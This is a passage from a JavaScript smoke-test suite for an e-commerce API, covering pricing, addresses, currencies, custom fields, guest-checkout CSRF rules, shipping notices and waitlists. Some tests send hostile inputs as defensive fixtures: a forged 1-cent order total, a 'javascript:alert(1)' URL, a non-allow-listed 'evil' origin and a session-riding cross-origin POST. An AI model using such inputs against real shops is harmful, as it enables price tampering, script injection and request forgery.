          method: 'PUT', headers: ch, body: JSON.stringify({ sale_price_cents: 20000 }),
        })).json().catch(() => null);
        if (dearer?.data?.on_sale === false && dearer.data.price_cents === 15900) {
          ok('a sale price above the regular price is not advertised as a discount');
        } else {
          fail('sale >= regular', `on_sale=${dearer?.data?.on_sale} price=${dearer?.data?.price_cents}`);
        }
      }

      // `on_sale` is derived, so a client claiming it on a full-price product
      // must be overruled. This route used to accept it in its validate schema
      // while PUT ignored it — a client could advertise a saving that did not
      // exist, which is a consumer-law problem before it is a data problem.
      const liar = await (await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ name: 'Smoke Not On Sale', slug: 'smoke-not-on-sale', price_cents: 1000, on_sale: true }),
      })).json().catch(() => null);
      if (liar?.data?.on_sale === false) ok('a client cannot flag a full-price product as on sale');
      else fail('on_sale accepted from client', `on_sale=${liar?.data?.on_sale}`);

      // The sibling in the same doc comment: in_stock is derived too.
      const oos = await (await fetch(`${BASE}/api/products`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ name: 'Smoke Sold Out', slug: 'smoke-sold-out', price_cents: 1000, stock: 0 }),
      })).json().catch(() => null);
      if (oos?.data?.in_stock === false) ok('a product created with stock 0 is not in stock');
      else fail('in_stock on create', `in_stock=${oos?.data?.in_stock} stock=${oos?.data?.stock}`);
      if (oos?.data?.id) {
        const restocked = await (await fetch(`${BASE}/api/products/${oos.data.id}`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ stock: 4 }),
        })).json().catch(() => null);
        if (restocked?.data?.in_stock === true) ok('restocking through the API sets in_stock back to true');
        else fail('in_stock on update', `in_stock=${restocked?.data?.in_stock}`);
      }
    }

    // --- checkout: server-side pricing ---
    if (productId) {
      const order = await fetch(`${BASE}/api/orders`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          email: 'buyer@example.com',
          // Hostile client: claims the order costs 1 cent.
          total_cents: 1,
          items: [{ product_id: productId, qty: 2 }],
        }),
      });
      const oj = await order.json().catch(() => null);
      if (order.status === 201 && oj?.data?.total_cents === 3000) ok('checkout prices server-side (client total ignored)');
      else fail('checkout pricing', `status=${order.status} total=${oj?.data?.total_cents} (expected 3000)`);
      if (oj?.data?.number && !('id' in (oj.data ?? {}))) ok('checkout response exposes no internal order id');
      else fail('checkout response shape', JSON.stringify(oj?.data)?.slice(0, 120));

      const stockNow = await (await fetch(`${BASE}/api/products/${productId}`)).json().catch(() => null);
      if (stockNow?.data?.stock === 2) ok('checkout decrements stock');
      else fail('stock decrement', `stock=${stockNow?.data?.stock} (expected 2)`);

      /* --- STRUCTURED ADDRESSES ---------------------------------------
       *
       * Its OWN product, so the stock arithmetic the rest of this section
       * asserts on is untouched — the currency block below sets the same
       * precedent and says why.
       *
       * Four properties, and the interesting ones are the last two:
       *   1. a structured address round-trips through storage;
       *   2. absent billing means "same as delivery", stored as a COPY;
       *   3. the LEGACY one-line field is re-rendered from the structured
       *      address, because two live storefronts read it and a coordinated
       *      deploy is not on offer;
       *   4. a client that sends ONLY the flat string still works and gets NO
       *      structured fields invented for it.
       */
      const addrProduct = await (await mkProduct(
        { name: 'Address Widget', slug: `addr-widget-${Date.now()}`, price_cents: 1000, stock: 20, status: 'active' },
      )).json().catch(() => null);
      const addrPid = addrProduct?.data?.id;
      if (addrPid) {
        const shipTo = {
          name: 'Maria K.', company: 'Maria Ltd', line1: 'Ερμού 15', line2: '3ος όροφος',
          city: 'Αθήνα', postcode: '10563', country: 'gr', phone: '+30 210 0000000',
        };
        const r = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            email: 'addr@example.com', name: 'Maria K.',
            items: [{ product_id: addrPid, qty: 1 }],
            shipping_address: shipTo,
          }),
        });
        const j = await r.json().catch(() => null);
        /*
         * Read the STORED order, not the checkout response.
         *
         * The buyer-facing response is a deliberately narrow projection —
         * number, money, status — and echoing an address back to an anonymous
         * poster would be a PII leak, not a feature. So the assertions below
         * fetch the order as staff. Asserting on the response instead would
         * have tested the projection and called it storage.
         */
        const asStaff = async (number) => {
          const list = await (await fetch(`${BASE}/api/orders`, { headers: ch }))
            .json().catch(() => null);
          return (list?.data ?? []).find((o) => o.number === number) ?? null;
        };
        const stored = await asStaff(j?.data?.number);
        const sa = stored?.shipping_address;
        const ba = stored?.billing_address;

        if (r.status === 201 && sa?.line1 === 'Ερμού 15' && sa?.city === 'Αθήνα') {
          ok('checkout stores a structured shipping address');
        } else fail('structured address', `status=${r.status} ${JSON.stringify(sa)?.slice(0, 140)}`);

        if (sa?.country === 'GR') ok('...upper-casing the country code');
        else fail('country normalisation', String(sa?.country));

        if (ba && ba.line1 === sa?.line1 && ba.postcode === sa?.postcode) {
          ok('...and copying it to billing when none was given');
        } else fail('billing copy', JSON.stringify(ba)?.slice(0, 140));

        // The compat projection. This is what stops the two storefronts
        // breaking on the deploy that ships this.
        const line = stored?.address ?? '';
        if (line.includes('Ερμού 15') && line.includes('10563 Αθήνα')) {
          ok('...and re-rendering the LEGACY one-line address from it');
        } else fail('legacy projection', JSON.stringify(line));
        if (!line.includes('Maria K.') && !line.includes('+30 210')) {
          ok('...without the name or phone, which are their own fields');
        } else fail('projection leaks name/phone', JSON.stringify(line));

        // A country that is not ISO-2 is refused, not silently dropped.
        const badR = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            email: 'addr2@example.com', items: [{ product_id: addrPid, qty: 1 }],
            shipping_address: { line1: 'x', city: 'y', postcode: 'z', country: 'Greece' },
          }),
        });
        if (badR.status === 400) ok('...while a country that is not ISO-2 is refused at checkout');
        else fail('bad country accepted', `status=${badR.status}`);

        // BACK-COMPAT: the flat-string client keeps working, unchanged, and
        // gets nothing invented for it.
        const legacyR = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            email: 'legacy@example.com', items: [{ product_id: addrPid, qty: 1 }],
            address: 'Ερμού 15, 3ος, 10563 Αθήνα',
          }),
        });
        const lj = await legacyR.json().catch(() => null);
        const legacyStored = await asStaff(lj?.data?.number);
        if (legacyR.status === 201 && legacyStored?.address === 'Ερμού 15, 3ος, 10563 Αθήνα') {
          ok('a flat-string checkout still works and keeps its string');
        } else fail('legacy checkout', `status=${legacyR.status} ${JSON.stringify(legacyStored?.address)}`);
        if (!legacyStored?.shipping_address) {
          ok('...and NO structured address is invented from it');
        } else fail('address was parsed', JSON.stringify(legacyStored?.shipping_address)?.slice(0, 140));

        // The customer record seeded a book from the delivery address.
        const cust = await (await fetch(`${BASE}/api/customers`, { headers: ch }))
          .json().catch(() => null);
        const seeded = (cust?.data ?? []).find((c) => c.email === 'addr@example.com');
        if (seeded?.addresses?.length === 1 && seeded.addresses[0].line1 === 'Ερμού 15') {
          ok('...and the customer address book was seeded from checkout');
        } else fail('address book seed', JSON.stringify(seeded?.addresses)?.slice(0, 140));
      } else fail('address fixture', 'could not create Address Widget');

      /* --- MULTI-CURRENCY: presentment, and the frozen rate ------------
       *
       * Its OWN product again, for the stock reason above. The properties:
       *   1. an operator-entered rate is stored through the dedicated route,
       *      which stamps updated_at server-side;
       *   2. a quote in a presentment currency converts, and reports the rate;
       *   3. the ORDER agrees with the quote — the bug worth most here is a
       *      basket quoted in one currency and charged in another;
       *   4. the base-currency view is frozen onto the order with the rate;
       *   5. an unknown currency falls back to base rather than erroring;
       *   6. changing the rate afterwards does NOT rewrite the placed order.
       */
      const fxProduct = await (await mkProduct(
        { name: 'FX Widget', slug: `fx-widget-${Date.now()}`, price_cents: 10000, stock: 30, status: 'active' },
      )).json().catch(() => null);
      const fxPid = fxProduct?.data?.id;
      if (fxPid) {
        const putRates = (rates) => fetch(`${BASE}/api/commerce/currencies`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ rates }),
        });

        const saved = await putRates([{ code: 'usd', rate_ppm: 1_087_000 }]);
        const savedJson = await saved.json().catch(() => null);
        if (saved.status === 200 && savedJson?.data?.rates?.[0]?.code === 'USD') {
          ok('an operator can store an exchange rate');
        } else fail('rate save', `status=${saved.status} ${JSON.stringify(savedJson)?.slice(0, 140)}`);
        if (savedJson?.data?.rates?.[0]?.updated_at) ok('...stamped with a server-side date');
        else fail('rate timestamp', JSON.stringify(savedJson?.data?.rates?.[0]));

        // Anonymous storefronts must be able to read the picker.
        const pub = await fetch(`${BASE}/api/commerce/currencies`);
        const pubJson = await pub.json().catch(() => null);
        if (pub.status === 200 && (pubJson?.data?.available ?? []).includes('USD')) {
          ok('...and an anonymous storefront can read the currency list');
        } else fail('public currency list', `status=${pub.status}`);

        const quoteIn = async (currency) => {
          const r = await fetch(`${BASE}/api/orders/quote`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({ items: [{ product_id: fxPid, qty: 2 }], currency }),
          });
          return r.json().catch(() => null);
        };
        const eur = await quoteIn(undefined);
        const usd = await quoteIn('USD');

        if (eur?.data?.currency === 'EUR' && eur?.data?.total_cents === 20000) {
          ok('a quote with no currency uses the shop base');
        } else fail('base quote', JSON.stringify(eur?.data)?.slice(0, 140));

        if (usd?.data?.currency === 'USD' && usd?.data?.total_cents === 21740) {
          ok('...and a quote in USD converts at the stored rate');
        } else fail('usd quote', `currency=${usd?.data?.currency} total=${usd?.data?.total_cents} (expected USD 21740)`);
        if (usd?.data?.fx_rate_ppm === 1_087_000) ok('...reporting the rate it used');
        else fail('quote rate', String(usd?.data?.fx_rate_ppm));

        // An unknown currency is NOT an error — the storefront sees base and
        // can tell, because the response says which currency it actually got.
        const cad = await quoteIn('CAD');
        if (cad?.data?.currency === 'EUR' && cad?.data?.total_cents === 20000) {
          ok('...while an unoffered currency falls back to base, and says so');
        } else fail('unknown currency', JSON.stringify(cad?.data)?.slice(0, 120));

        // THE ONE THAT MATTERS: what was quoted is what is charged.
        const placed = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({
            email: 'fx@example.com', items: [{ product_id: fxPid, qty: 2 }], currency: 'USD',
          }),
        });
        const pj = await placed.json().catch(() => null);
        if (placed.status === 201 && pj?.data?.currency === 'USD'
            && pj?.data?.total_cents === usd?.data?.total_cents) {
          ok('...and the ORDER is charged exactly what the quote said');
        } else fail('quote/order agreement',
          `order=${pj?.data?.total_cents} ${pj?.data?.currency} vs quote=${usd?.data?.total_cents}`);

        const storedFx = await (async () => {
          const list = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
          return (list?.data ?? []).find((o) => o.number === pj?.data?.number) ?? null;
        })();
        if (storedFx?.base_currency === 'EUR' && storedFx?.base_total_cents === 20000) {
          ok('...with the base-currency view frozen alongside it');
        } else fail('base view', JSON.stringify({ c: storedFx?.base_currency, t: storedFx?.base_total_cents }));
        if (storedFx?.fx_rate_ppm === 1_087_000 && storedFx?.fx_rate_at) {
          ok('...and the exact rate that was used, with its date');
        } else fail('frozen rate', String(storedFx?.fx_rate_ppm));

        // Move the rate. The PLACED order must not move with it — this is the
        // whole reason the rate is frozen rather than looked up on read.
        await putRates([{ code: 'USD', rate_ppm: 2_000_000 }]);
        const after = await (async () => {
          const list = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
          return (list?.data ?? []).find((o) => o.number === pj?.data?.number) ?? null;
        })();
        if (after?.total_cents === storedFx?.total_cents && after?.fx_rate_ppm === 1_087_000) {
          ok('...and changing the rate later does NOT rewrite the placed order');
        } else fail('order re-converted', `total=${after?.total_cents} rate=${after?.fx_rate_ppm}`);

        // Leave the shop as we found it — a rate left behind would quote every
        // later assertion in this suite in dollars.
        await putRates([]);
        const cleaned = await (await fetch(`${BASE}/api/commerce/currencies`)).json().catch(() => null);
        if ((cleaned?.data?.rates ?? []).length === 0) ok('...and the fixture leaves no rates behind');
        else fail('rate fixture leak', JSON.stringify(cleaned?.data?.rates)?.slice(0, 120));
      } else fail('fx fixture', 'could not create FX Widget');

      /* --- MERCHANT-DEFINABLE PRODUCT FIELDS ---------------------------
       *
       * The property worth the most here is the READ LEAK: both product routes
       * spread the whole product, so a merchant field like a cost price would
       * be published to the world unless one shared projection strips it in
       * BOTH. So this asserts the anonymous view and the staff view of the SAME
       * product, through both routes.
       */
      const defsRes = await fetch(`${BASE}/api/commerce/product-fields`, {
        method: 'PUT', headers: ch,
        body: JSON.stringify({
          fields: [
            { name: 'frame_width_mm', label: 'Frame width (mm)', rule: { type: 'number', optional: true }, visibility: 'public' },
            { name: 'cost_price_cents', rule: { type: 'number', optional: true } },
          ],
        }),
      });
      if (defsRes.status === 200) ok('an admin can declare product fields');
      else fail('declare fields', `status=${defsRes.status}`);

      const cfProduct = await (await mkProduct({
        name: 'Custom Field Widget', slug: `cf-widget-${Date.now()}`,
        price_cents: 5000, stock: 5, status: 'active',
        custom: { frame_width_mm: 52, cost_price_cents: 1200 },
      })).json().catch(() => null);
      const cfPid = cfProduct?.data?.id;
      const cfSlug = cfProduct?.data?.slug;

      if (cfPid && cfProduct?.data?.custom?.frame_width_mm === 52) {
        ok('...and store values against them');
      } else fail('custom values', JSON.stringify(cfProduct?.data?.custom));

      // A value outside the merchant's OWN rule is refused, not dropped.
      const badVal = await mkProduct({
        name: 'Bad CF', slug: `bad-cf-${Date.now()}`, price_cents: 100,
        custom: { frame_width_mm: 'wide' },
      });
      if (badVal.status === 400) ok('...refusing a value that breaks the merchant\'s own rule');
      else fail('custom validation', `status=${badVal.status}`);

      if (cfSlug) {
        // ANONYMOUS, single-product route.
        const anon = await (await fetch(`${BASE}/api/products/${cfSlug}`)).json().catch(() => null);
        if (anon?.data?.custom?.frame_width_mm === 52) ok('a public custom field reaches an anonymous storefront');
        else fail('public custom field', JSON.stringify(anon?.data?.custom));
        if (!('cost_price_cents' in (anon?.data?.custom ?? {}))) {
          ok('...and a STAFF-ONLY one does not');
        } else fail('COST PRICE LEAKED to an anonymous caller', JSON.stringify(anon?.data?.custom));

        // ANONYMOUS, list route — the sibling that gets forgotten.
        const anonList = await (await fetch(`${BASE}/api/products`)).json().catch(() => null);
        const inList = (anonList?.data ?? []).find((p) => p.slug === cfSlug);
        if (inList && !('cost_price_cents' in (inList.custom ?? {}))) {
          ok('...and the LIST route strips it too');
        } else fail('cost price leaked via the list route', JSON.stringify(inList?.custom));

        // STAFF must see the whole bag: the admin form loads through this route
        // and saves what it loaded.
        const staffView = await (await fetch(`${BASE}/api/products/${cfSlug}`, { headers: ch }))
          .json().catch(() => null);
        if (staffView?.data?.custom?.cost_price_cents === 1200) {
          ok('...while STAFF see the whole bag, so the admin form cannot save a stripped one');
        } else fail('staff view stripped', JSON.stringify(staffView?.data?.custom));

        // The schema endpoint a headless storefront discovers fields through.
        const schema = await (await fetch(`${BASE}/api/commerce/product-fields`)).json().catch(() => null);
        const names = (schema?.data?.fields ?? []).map((f) => f.name);
        if (names.includes('frame_width_mm')) ok('a storefront can discover the public field schema');
        else fail('schema discovery', JSON.stringify(names));
        if (!names.includes('cost_price_cents')) {
          ok('...which does not disclose the NAME of a staff-only field');
        } else fail('private field name disclosed', JSON.stringify(names));

        // Deleting a definition must not destroy the data.
        await fetch(`${BASE}/api/commerce/product-fields`, {
          method: 'PUT', headers: ch, body: JSON.stringify({ fields: [] }),
        });
        const afterDelete = await (await fetch(`${BASE}/api/products/${cfSlug}`, { headers: ch }))
          .json().catch(() => null);
        if (afterDelete?.data?.custom?.frame_width_mm === 52) {
          ok('...and deleting the DEFINITION does not delete the stored values');
        } else fail('values destroyed with the definition', JSON.stringify(afterDelete?.data?.custom));
        // ...but they stop being published, immediately, with no re-save.
        const anonAfter = await (await fetch(`${BASE}/api/products/${cfSlug}`)).json().catch(() => null);
        if (!('frame_width_mm' in (anonAfter?.data?.custom ?? {}))) {
          ok('...while the public view stops publishing them on the very next read');
        } else fail('still public after undeclaring', JSON.stringify(anonAfter?.data?.custom));
      }

      // --- the shop currency is CONFIGURABLE, and FROZEN once placed ---
      //
      // `placeOrder()` wrote the literal 'EUR', so every install on earth was a
      // euro shop while the money formatter happily handled any currency — the
      // platform looked multi-currency and was not. Two properties matter and
      // only one of them is the obvious one.
      {
        const before = oj?.data?.number;
        const firstCur = (await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null))
          ?.data?.find((o) => o.number === before)?.currency;
        if (firstCur === 'EUR') ok('currency: the default is EUR when nothing is configured');
        else fail('default currency', `got ${firstCur}`);

        const setCur = await fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify({ shop_currency: 'gbp' }),
        });
        if (setCur.status === 200) ok('currency: an operator can set it');
        else fail('currency save', `status=${setCur.status}`);

        // Stored upper-case, so every reader sees one spelling.
        const read = await (await fetch(`${BASE}/api/settings/get`, { headers: ch })).json().catch(() => null);
        if (read?.data?.shop_currency === 'GBP') ok('...normalised to upper case at the door');
        else fail('currency normalisation', JSON.stringify(read?.data?.shop_currency));

        // A junk code must be REFUSED, not silently accepted — it would be
        // frozen onto every future order and reach real invoices.
        const junk = await fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify({ shop_currency: '€' }),
        });
        if (junk.status === 400) ok('...and a symbol instead of a code is refused');
        else fail('currency validation', `status=${junk.status} for "€"`);

        // THE NEW ORDER takes the configured currency. Its OWN product, so the
        // stock arithmetic the rest of this section asserts on is untouched.
        const curProd = await (await mkProduct({
          name: 'Currency Widget', slug: 'currency-widget', price_cents: 1200, stock: 9,
        })).json().catch(() => null);
        const curPid = curProd?.data?.id;
        const gbpOrder = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ email: 'gbp@example.com', items: [{ product_id: curPid, qty: 1 }] }),
        });
        const gbpNum = (await gbpOrder.json().catch(() => null))?.data?.number;
        const listed = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
        const rows = Array.isArray(listed?.data) ? listed.data : [];
        const fresh = rows.find((o) => o.number === gbpNum);
        if (fresh?.currency === 'GBP') ok('currency: a new order is priced in the configured currency');
        else fail('order currency', `got ${fresh?.currency} (expected GBP)`);

        // ...and the QUOTE agrees with it. A basket quoted in one currency and
        // an order placed in another is the worst shape of this bug: every
        // number is right and only the symbol is wrong.
        const quoted = await (await fetch(`${BASE}/api/orders/quote`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ items: [{ product_id: curPid, qty: 1 }] }),
        })).json().catch(() => null);
        if (quoted?.data?.currency === 'GBP') ok('...and the quote agrees with the order');
        else fail('quote currency', `got ${quoted?.data?.currency}`);

        // ...AND THE OLD ORDER IS UNTOUCHED. This is the property that matters:
        // the code is frozen at checkout like the line items, so changing the
        // setting changes the NEXT order and rewrites nothing. An invoice must
        // always say what was actually charged, and a shop that switches
        // currency must not retroactively restate last year's books.
        const old = rows.find((o) => o.number === before);
        if (old?.currency === 'EUR') ok('currency: an EXISTING order keeps what it was placed in');
        else fail('historical currency rewritten', `order ${before} now says ${old?.currency}`);

        // Put it back, so nothing downstream sees a surprise currency.
        await fetch(`${BASE}/api/settings/update`, {
          method: 'POST', headers: ch, body: JSON.stringify({ shop_currency: 'EUR' }),
        });
      }

      // --- GUEST CHECKOUT FROM A HEADLESS STOREFRONT ---
      //
      // This suite proved for a long time that an OPERATOR can place an order:
      // every checkout call here carries `ch`, which holds an admin session and
      // a CSRF token. A real shopper has neither. Both live shops are headless
      // storefronts on their own domains, so a guest pressing Buy sends a
      // COOKIE-LESS CROSS-ORIGIN POST — and that was `403 CSRF_FAILED` on every
      // public write, because only the assistant widget was exempt.
      //
      // The double-submit dance is not available to that caller at all: reading
      // the CSRF cookie cross-site needs credentials:'include', a
      // SameSite=None; Secure cookie and third-party cookie support, which
      // browsers are removing. Requiring it did not make checkout safer, it
      // made checkout impossible.
      //
      // The suite boots with CORS_ORIGINS=https://frontend.example.com, so the
      // allow-listed and non-allow-listed cases are both real here.
      {
        const STORE = 'https://frontend.example.com';
        const guestProd = await (await mkProduct({
          name: 'Guest Widget', slug: 'guest-widget', price_cents: 2500, stock: 20,
        })).json().catch(() => null);
        const gp = guestProd?.data?.id;
        const basket = (email) => JSON.stringify({ email, items: [{ product_id: gp, qty: 1 }] });
        const json = { 'Content-Type': 'application/json' };

        // THE CASE THAT WAS BROKEN: a shopper's browser, no cookie, allow-listed.
        const guest = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: { ...json, Origin: STORE }, body: basket('guest@example.com'),
        });
        const gj = await guest.json().catch(() => null);
        if (guest.status === 201 && gj?.data?.number) ok('guest checkout: a cookie-less shopper CAN place an order');
        else fail('guest checkout', `status=${guest.status} ${JSON.stringify(gj)?.slice(0, 120)}`);

        // ...and the two steps either side of it, because guest checkout is all
        // three or none.
        const q = await fetch(`${BASE}/api/orders/quote`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ items: [{ product_id: gp, qty: 1 }] }),
        });
        if (q.status === 200) ok('...and can price the basket first');
        else fail('guest quote', `status=${q.status}`);

        const pay = await fetch(`${BASE}/api/payments/start`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ number: gj?.data?.number, email: 'guest@example.com', method: 'bank-transfer' }),
        });
        // Any answer but a CSRF refusal: the method may be unavailable in this
        // install, and that is a different, honest failure.
        if (pay.status !== 403) ok('...and can open a payment session');
        else fail('guest payment start', 'still refused as CSRF');

        // The storefront's own forms, the same shape and the same fix.
        const contact = await fetch(`${BASE}/api/contact`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ name: 'Guest', email: 'guest@example.com', message: 'Hello from the storefront' }),
        });
        if (contact.status !== 403) ok('...and the storefront contact form reaches the shop');
        else fail('guest contact', 'still refused as CSRF');

        // ---- and now everything that must STILL be refused ----

        // A different site. The Origin header cannot be forged by page script,
        // so this is what bounds the exemption to the operator's own storefront.
        const evil = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: { ...json, Origin: 'https://evil.example.com' },
          body: basket('evil@example.com'),
        });
        if (evil.status === 403) ok('guest checkout: a NON-allow-listed origin is still refused');
        else fail('cors bypass', `evil origin got ${evil.status}`);

        // No Origin at all is a non-browser caller — curl, or a storefront's
        // SERVER. That must use an API key, which is already CSRF-exempt and
        // carries a role. Exempting the header-less case would exempt everyone.
        const noOrigin = await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: json, body: basket('curl@example.com'),
        });
        if (noOrigin.status === 403) ok('...and a request with no Origin still needs a token or a key');
        else fail('originless bypass', `got ${noOrigin.status}`);

        // THE ATTACK THIS GUARD EXISTS FOR: a request carrying a SESSION still
        // gets the full CSRF check, whatever its origin. Skipping it there
        // would let any page place orders using a signed-in admin's session.
        const withSession = await fetch(`${BASE}/api/orders`, {
          method: 'POST',
          headers: { ...json, Origin: STORE, Cookie: sessionCookie },
          body: basket('ridden@example.com'),
        });
        if (withSession.status === 403) ok('...and a SESSION-carrying request is still CSRF-checked');
        else fail('csrf bypassed for a session', `got ${withSession.status} — a page could ride an admin session`);

        // A write that is NOT public must not have been widened by any of this.
        const notPublic = await fetch(`${BASE}/api/products`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ name: 'Injected', slug: 'injected', price_cents: 1 }),
        });
        if (notPublic.status === 401 || notPublic.status === 403) {
          ok('...and a staff-only write is untouched by the exemption');
        } else fail('exemption widened a staff write', `POST /api/products got ${notPublic.status}`);
      }

      // --- tracking, the shipped notice, and the SHOP's own note ---
      //
      // "Where is my order" is the most common message a small shop gets, and
      // it arrives because nothing told the customer the parcel left. The order
      // status machine, the email layer and editable templates all existed;
      // there was nowhere to put a tracking number.
      {
        const before = emailReceiver.deliveries.length;
        const shipProd = await (await mkProduct({
          name: 'Ship Widget', slug: 'ship-widget', price_cents: 3300, stock: 6,
        })).json().catch(() => null);
        const made = await (await fetch(`${BASE}/api/orders`, {
          method: 'POST', headers: ch,
          body: JSON.stringify({ email: 'ship-buyer@example.com',
            items: [{ product_id: shipProd?.data?.id, qty: 1 }] }),
        })).json().catch(() => null);
        const listed = await (await fetch(`${BASE}/api/orders`, { headers: ch })).json().catch(() => null);
        const target = (Array.isArray(listed?.data) ? listed.data : [])
          .find((o) => o.number === made?.data?.number);

        if (!target?.id) {
          fail('ship: no order created', JSON.stringify(made)?.slice(0, 120));
        } else {
          // Nothing to track is not a shipment.
          const empty = await fetch(`${BASE}/api/orders/${target.id}/ship`, {
            method: 'POST', headers: ch, body: JSON.stringify({ tracking_carrier: 'ELTA' }),
          });
          if (empty.status === 400) ok('ship: a notice with nothing to track is refused');
          else fail('ship empty', `status=${empty.status}`);

          // A pasted "URL" that is not http(s) is a mistake worth naming — and
          // a javascript: link is live in some mail clients.
          const bad = await fetch(`${BASE}/api/orders/${target.id}/ship`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({ tracking_number: 'X1', tracking_url: 'javascript:alert(1)' }),
          });
          if (bad.status === 400) ok('ship: a non-http tracking URL is refused, not dropped');
          else fail('ship bad url', `status=${bad.status}`);

          const shipped = await fetch(`${BASE}/api/orders/${target.id}/ship`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({ tracking_carrier: 'ELTA Courier', tracking_number: 'EL123456789GR' }),
          });
          const sj = await shipped.json().catch(() => null);
          if (shipped.status === 200 && sj?.data?.notified === true) ok('ship: tracking saves and notifies');
          else fail('ship', `status=${shipped.status} ${JSON.stringify(sj)?.slice(0, 120)}`);

          let mail = null;
          for (let i = 0; i < 40 && !mail; i += 1) {
            await new Promise((r) => setTimeout(r, 100));
            mail = emailReceiver.deliveries.slice(before)
              .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
              .find((m) => m && String(m.to ?? '') === 'ship-buyer@example.com'
                && /on its way/i.test(String(m.subject ?? '') + String(m.text ?? ''))) ?? null;
          }
          if (mail) ok('...and the customer is emailed that it is on its way');
          else fail('no shipped notice', 'nothing addressed to ship-buyer@example.com');
          if (mail && String(mail.text).includes('EL123456789GR')) ok('...carrying the tracking number');
          else fail('shipped notice content', String(mail?.text ?? '').slice(0, 160));

          // THE ONCE-ONLY GUARD. Correcting a typo must not re-notify.
          const midway = emailReceiver.deliveries.length;
          const again = await fetch(`${BASE}/api/orders/${target.id}/ship`, {
            method: 'POST', headers: ch,
            body: JSON.stringify({ tracking_carrier: 'ELTA Courier', tracking_number: 'EL999999999GR' }),
          });
          const aj = await again.json().catch(() => null);
          if (again.status === 200 && aj?.data?.notified === false) {
            ok('...and correcting the number does NOT email the customer again');
          } else fail('ship re-notified', JSON.stringify(aj)?.slice(0, 120));
          await new Promise((r) => setTimeout(r, 400));
          const extra = emailReceiver.deliveries.slice(midway)
            .map((d) => { try { return JSON.parse(d.body); } catch { return null; } })
            .filter((m) => m && String(m.to ?? '') === 'ship-buyer@example.com');
          if (extra.length === 0) ok('...proved by the receiver, not just the flag');
          else fail('second shipped notice sent', String(extra.length));

          // --- the SHOP's note, which is not the buyer's ---
          const noted = await fetch(`${BASE}/api/orders/${target.id}`, {
            method: 'PUT', headers: ch,
            body: JSON.stringify({ staff_note: 'Called — collecting Tuesday' }),
          });
          if (noted.status === 200) ok('staff note: an operator can record one');
          else fail('staff note', `status=${noted.status}`);

          const back = await (await fetch(`${BASE}/api/orders/${target.id}`, { headers: ch })).json().catch(() => null);
          if (back?.data?.staff_note === 'Called — collecting Tuesday') ok('...and it persists');
          else fail('staff note lost', JSON.stringify(back?.data?.staff_note));
          // The buyer's own note must be untouched by it.
          if ((back?.data?.note ?? '') === (target.note ?? '')) {
            ok('...without overwriting the customer\'s own note');
          } else fail('buyer note clobbered', `${target.note} -> ${back?.data?.note}`);
        }
      }

      // --- "tell me when it's back" ---
      //
      // A sold-out product is a customer who came to buy and left. The route is
      // public and cookie-less because it is the STOREFRONT's button, and it
      // answers identically whether it stored anything or not.
      {
        const STORE = 'https://frontend.example.com';
        const json = { 'Content-Type': 'application/json' };
        const soldOut = await (await mkProduct({
          name: 'Waitlist Widget', slug: 'waitlist-widget', price_cents: 4400, stock: 0,
        })).json().catch(() => null);
        const wid = soldOut?.data?.id;

        const asked = await fetch(`${BASE}/api/products/${wid}/notify-me`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ email: 'waiting@example.com' }),
        });
        if (asked.status === 200) ok('waitlist: a shopper can ask to be told');
        else fail('waitlist signup', `status=${asked.status}`);

        // A mistyped address IS named — the visitor can fix that one.
        const bad = await fetch(`${BASE}/api/products/${wid}/notify-me`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ email: 'not-an-address' }),
        });
        if (bad.status === 400) ok('...and a malformed address is named, so it can be corrected');
        else fail('waitlist bad email', `status=${bad.status}`);

        // Everything else is indistinguishable: asking twice, asking about a
        // product that is in stock, asking about one that does not exist.
        const twice = await fetch(`${BASE}/api/products/${wid}/notify-me`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ email: 'waiting@example.com' }),
        });
        const ghost = await fetch(`${BASE}/api/products/no-such-product/notify-me`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ email: 'waiting@example.com' }),
        });
        const inStock = await fetch(`${BASE}/api/products/${productId}/notify-me`, {
          method: 'POST', headers: { ...json, Origin: STORE },
          body: JSON.stringify({ email: 'waiting@example.com' }),
        });
        if (twice.status === 200 && ghost.status === 200 && inStock.status === 200) {
          ok('...and asking twice, about a ghost, or about something in stock all answer alike');
        } else {
          fail('waitlist oracle',
            `twice=${twice.status} ghost=${ghost.status} inStock=${inStock.status}`);
        }
      }

      // --- AUTOMATIC cart rules: a discount with no code to type ---
      //
      // "Spend €50, free shipping" is roughly half of what a shop wants from
      // promotions, and all of it was unreachable: every discount needed a code
